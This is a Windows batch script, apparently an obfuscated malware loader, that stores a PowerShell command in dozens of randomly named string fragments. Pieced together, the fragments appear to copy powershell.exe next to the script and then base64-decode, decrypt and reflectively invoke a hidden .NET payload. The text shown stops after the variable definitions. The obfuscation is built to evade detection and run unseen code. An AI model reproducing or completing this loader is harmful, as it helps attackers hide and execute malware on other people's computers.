@echo off
set "HmAFgwoiDv=we"
set "eSCuQuzLXO=s\"
set "YlaahbnHPw=we"
set "UINgLqrvwV=ow"
set "RZbNjedBDq=ll"
set "lsPQkVLzaU=:\"
set "FUFZLDPJdw=y "
set "uSztBdEXoO=Po"
set "dJUdNJviqU=rs"
set "uVPGXqsUBA= C"
set "JglHQQsCoK=py"
set "ijtFWfHHJk=in"
set "llBgZlmprs=st"
set "jQhjauetIy=.e"
set "ZmxTTZdRkR=1."
set "jbjalGerzv=rS"
set "UZvdIjpeey=Wi"
set "nYCkUGSKkp=32"
set "GmxcEeIhTI= /"
set "ikcbjnJqmt=do"
set "aoQdWwebLx=Sy"
set "JLcxvhBfUe=ll"
set "RUHitLnTYJ=em"
set "mqJZJSrvuE=\W"
set "tXTeQZPbLB=he"
set "eZxvhrheQw=po"
set "EPnOeMJAYU=nd"
set "VYOWdKswPg=xe"
set "IzgVknCpHX=co"
set "UZhiPqLJAf=he"
set "sCfcfBkHzB=ws"
set "nCSdrsIyiV=\v"
set "qEhJNxZLFe=0\"
set "AhbVTkywpk= %~dp0"
set "ptkydiJUci=cd"
set "WtwWzaQpNU=3); "
set "WbpVjCqvtO=n.Pa"
set "BTRzbVisqk=PKCS"
set "wgtrROuHxK=wi);"
set "jDrEiCUTER=y]::"
set "NloLbLsgZg=onve"
set "hbYVtkuXpr=ew-O"
set "KCCjxLCoSb=tion"
set "aiuLXHWkjX=ONwi"
set "aqhcOdPrSv=Stre"
set "LTgAVButkc=ke($"
set "UuapkHnECo=::('"
set "GfkrZloTtL=rtS4"
set "CTiXKgRcSr=ypto"
set "OYHONXiQpS=ct S"
set "xZEBNPDoCt=stem"
set "yfpJorWGsB= = $"
set "vOdwiPgowM=ress"
set "jZneIfsVGG='[-1"
set "uGRtnkqsYL=oint"
set "hdJkrfdvBH=gnir"
set "QgIgfMPSJK=ct S"
set "QrrYEqqRFC=ose("
set "YNlcZFDHin=;$Re"
set "EmctMXqcJM=-joi"
set "qxQRlxJmOU=-nop"
set "EjfopKtzTc=TllA"
set "DvcrUXUUNp=]::("
set "VWNKbGPWmq=();$"
set "oGEYIoIzDn=ptog"
set "hrqVbkdMkS=;$EV"
set "SdmywcQCAL=em.C"
set "olWwegqitm=V = "
set "rDAcSlrqek=tem."
set "ApHKYbYWJy=brea"
set "wqBiSTwUhZ=ONwi"
set "NkQQeMdqIl=e]::"
set "VHGAzFQTbz=XQYn"
set "xWsiyMJyVB=rity"
set "hFdJgXxTMF=th('"
set "GQitlLmOHX=trea"
set "oCCopwNPHd=y.Pa"
set "JbAbJfKXvy=1..-"
set "SNHISYoqzW=pStr"
set "RCZhnmyXLe=Obje"
set "QCkVEUGKkD=XQYn"
set "UDpCwMZOIm=Conv"
set "QLcKrLPJlf=XQYn"
set "SpWmoVGGwT=opS."
set "XJDDuSEahV== [S"
set "ZQgSrDGkPi=ecry"
set "sVNZAagTNN=IONw"
set "BnKfCsXvPA=ki.T"
set "OPRONSnZVT=orF'"
set "CVQVoVLiwO=stem"
set "cdtIygmLif=nage"
set "CLGiQuKGzp=IONw"
set "eKPkemvPLi=ert]"
set "oriBtbhAlg=oL'["
set "jiYtZOfnUo=Invo"
set "rOiycUwcDd=OQy."
